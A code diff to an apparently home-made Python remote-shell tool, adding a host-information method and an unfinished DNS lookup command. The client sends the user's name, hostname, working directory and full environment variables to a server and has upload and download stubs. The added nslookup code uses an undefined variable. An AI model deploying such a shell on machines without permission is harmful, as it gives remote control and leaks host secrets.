@@ -8,6 +8,7 @@ import getpass
 import struct
 import subprocess
 from pathlib import Path
+from dns import resolver
 from typing import Union
 
 from multi import utils
@@ -24,16 +25,14 @@ class SocketShell(object):
         self.RemoteOpSys = None
         self.Environment = None
         self.SpecialCmds = [
-            {"exit": ["exit", "quit", "logout"]},
-            {"ls": ["ls", "dir", "gci", "get-childitem"]},
-            {"cd": ["cd", "set-location"]},
-            {"clear": ["clear", "cls", "clear-host"]},
-            {"grep": ["grep", "findstr"]},
-            {"route": ["route"]},
-            {"ps": ["get-process", "ps"]},
-            {"upload": ["upload"]},
-            {"download": ["download"]},
-            {"search": ["search"]},
+            {"about": ("sysinfo", "about")},
+            {"cd": ("cd", "set-location")},
+            {"clear": ("clear", "cls", "clear-host")},
+            {"exit": ("exit", "quit", "logout")},
+            {"fqdn": ("fqdn", "domain")},
+            {"ls": ("ls", "dir", "gci", "get-childitem")},
+            {"resolve": ("resolve", "lookup")},
+            {"route": ("route", "route6")},
         ]
 
     def _run_cmd(self, command: str, binary: str) -> tuple:
@@ -129,7 +128,7 @@ class SocketShell(object):
         as user/host information. Return a tuple with two strings."""
         uname = platform.uname()
         return (
-            "::".join([
+            "::".join((
                 getpass.getuser(),
                 socket.gethostname(),
                 self.LastWD,
@@ -137,24 +136,94 @@ class SocketShell(object):
                 self.Shell,
                 time.asctime(),
                 str(os.environ.copy())[1: -1],
-            ]),
-            " ".join([
+            )),
+            " ".join((
                 uname.system,
                 uname.node,
                 uname.release,
                 uname.version,
                 uname.machine
-            ])
+            ))
         )
+
+    def about_host(self) -> bytes:
+        """Get local system info to send to server"""
+        uname = platform.uname()
+        info = " ".join((
+            uname.system,
+            uname.node,
+            uname.release,
+            uname.version,
+            uname.machine
+        ))
+
+        if "\\" in self.Shell:
+            shell = self.Shell.replace("\\", "/")
+        else:
+            shell = self.Shell
+
+        return b"\r\n".join((
+            time.asctime().encode(),
+            info.encode(),
+            ("-" * 25).encode(),
+            f"Hostname: {socket.gethostname()}".encode(),
+            f"Username: {getpass.getuser()}".encode(),
+            f"Shell: {shell.split('/')[-1]}\r\n".encode()
+        ))
+
+    @staticmethod
+    def nslookup(command: str) -> tuple:
+        """Run DNS query, return bytes tuple (stdout and stderr)"""
+        # TODO: test and integrate, add reverse dns logic
+        usage = "nslookup [-s SERVER] NAME"
+        cmd_args = command.split()
+        server = "8.8.8.8"
+
+        if len(cmd_args) == 1:
+            msg = "Missing required argument for NAME"
+            return b"", f"{usage}\r\n{msg}\r\n".encode()
+
+        if "-s" in cmd_args:
+            val_index = cmd_args.index("-s") + 1
+
+            if not 0 <= val_index < len(cmd_args):
+                msg = "Missing required argument for SERVER"
+                return b"", f"{usage}\r\n{msg}\r\n".encode()
+
+            if not utils.valid_ipv4(cmd_args[val_index]):
+                msg = "SERVER is not a valid IPv4 address"
+                return b"", f"{usage}\r\n{msg}\r\n".encode()
+            else:
+                server = cmd_args[val_index]
+
+        try:
+            server_info = socket.gethostbyaddr(server)
+        except socket.herror:
+            serv_name = server
+        else:
+            if "dns" in server_info[0]:
+                serv_name = server_info[0]
+            else:
+                serv_name = server
+
+        res = resolver.Resolver()
+        res.nameservers = [server]
+        results = [x.address for x in res.query(name)]
+
+        output = b"\r\n".join((
+            f"Server: {serv_name}".encode(),
+            f"Address: {server}\r\n".encode(),
+            f"Name: {name}".encode(),
+            f"Address: {results[0]}".encode()
+        ))
+
+        return output, b""
 
     def upload(self, target: str, path: str) -> None:
         """Upload files from the local system to the remote system"""
 
     def download(self, path: str) -> bytes:
         """Download files from the remote system to the local system"""
-
-    def search(self, pattern: str, target_type: str) -> list:
-        """Search the file system for a specific pattern and target type"""
 
 
 class StreamSocket(SocketShell):
@@ -200,6 +269,7 @@ class StreamSocket(SocketShell):
         if raw_len:
             length = struct.unpack(">I", raw_len)[0]
             data = self._recv_all(sock, length).decode().split("::")
+
             return data[0], data[1]
         else:
             return "", ""
@@ -208,8 +278,8 @@ class StreamSocket(SocketShell):
     def send_output(sock: socket.socket, msg: str, out_type: str) -> None:
         """Prefix/send messages with 32-bit unsigned int size prefix. This
         method is intended to be used by Client to send command output"""
-        if out_type in ["output", "error"]:
-            msg = "::".join([out_type, msg])
+        if out_type in ("output", "error"):
+            msg = "::".join((out_type, msg))
         else:
             raise ValueError("Expected <out_type> to be in [output|error]")
 
@@ -226,14 +296,14 @@ class StreamSocket(SocketShell):
     @staticmethod
     def except_handler(exc: Exception) -> None:
         """Handle common socket connection exceptions"""
-        sock_excepts = [
+        sock_excepts = (
             OSError,
             socket.timeout,
             socket.gaierror,
             socket.herror
-        ]
+        )
 
         if exc.__class__.__name__ in sock_excepts:
-            utils.throw([exc.args[1]])
+            utils.throw(exc.args[1])
         else:
             raise exc
